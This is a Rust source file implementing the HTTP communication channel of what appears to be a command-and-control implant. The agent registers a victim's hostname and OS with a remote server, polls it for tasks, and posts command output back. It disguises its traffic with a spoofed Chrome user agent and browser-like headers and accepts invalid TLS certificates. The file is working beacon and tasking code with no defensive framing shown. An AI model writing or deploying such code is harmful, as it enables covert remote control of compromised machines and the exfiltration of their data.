use log::{info, error, debug};
use reqwest::Client;
use std::time::Duration;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
struct HttpBeacon {
    agent_id: String,
    hostname: String,
    os: String,
    data: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct HttpTaskResponse {
    tasks: Vec<HttpTask>,
    sleep: u64,
}

#[derive(Debug, Serialize, Deserialize)]
struct HttpTask {
    id: u64,
    command: serde_json::Value,
}

pub struct HttpChannel {
    client: Client,
    base_url: String,
    agent_id: String,
    session_cookie: Option<String>,
}

impl HttpChannel {
    pub fn new(server_ip: &str, port: u16, agent_id: &str) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_else(|_| Client::new());

        Self {
            client,
            base_url: format!("http://{}:{}", server_ip, port),
            agent_id: agent_id.to_string(),
            session_cookie: None,
        }
    }

    pub async fn register(&mut self, hostname: &str, os: &str) -> Result<(), String> {
        let beacon = HttpBeacon {
            agent_id: self.agent_id.clone(),
            hostname: hostname.to_string(),
            os: os.to_string(),
            data: None,
        };

        let resp = self.client
            .post(format!("{}/api/http/register", self.base_url))
            .json(&beacon)
            .header("Accept", "text/html,application/xhtml+xml")
            .header("Accept-Language", "en-US,en;q=0.9")
            .send()
            .await
            .map_err(|e| format!("HTTP register failed: {}", e))?;

        if let Some(cookie) = resp.headers().get("set-cookie") {
            self.session_cookie = Some(cookie.to_str().unwrap_or("").to_string());
        }

        if resp.status().is_success() {
            info!("HTTP channel: registered successfully");
            Ok(())
        } else {
            Err(format!("Register failed with status: {}", resp.status()))
        }
    }

    pub async fn checkin(&self) -> Result<Vec<(u64, serde_json::Value)>, String> {
        let mut req = self.client
            .get(format!("{}/api/http/tasks/{}", self.base_url, self.agent_id))
            .header("Accept", "application/json, text/plain, */*")
            .header("X-Requested-With", "XMLHttpRequest");

        if let Some(ref cookie) = self.session_cookie {
            req = req.header("Cookie", cookie.as_str());
        }

        let resp = req.send().await
            .map_err(|e| format!("HTTP checkin failed: {}", e))?;

        if !resp.status().is_success() {
            return Err(format!("Checkin status: {}", resp.status()));
        }

        let body: HttpTaskResponse = resp.json().await
            .map_err(|e| format!("Parse tasks failed: {}", e))?;

        Ok(body.tasks.into_iter().map(|t| (t.id, t.command)).collect())
    }

    pub async fn send_result(&self, cmd_id: u64, output: &str, status: &str) -> Result<(), String> {
        let payload = serde_json::json!({
            "agent_id": self.agent_id,
            "cmd_id": cmd_id,
            "status": status,
            "output": output,
        });

        let mut req = self.client
            .post(format!("{}/api/http/result", self.base_url))
            .json(&payload)
            .header("Accept", "application/json");

        if let Some(ref cookie) = self.session_cookie {
            req = req.header("Cookie", cookie.as_str());
        }

        let resp = req.send().await
            .map_err(|e| format!("Send result failed: {}", e))?;

        if resp.status().is_success() {
            Ok(())
        } else {
            Err(format!("Result post failed: {}", resp.status()))
        }
    }
}
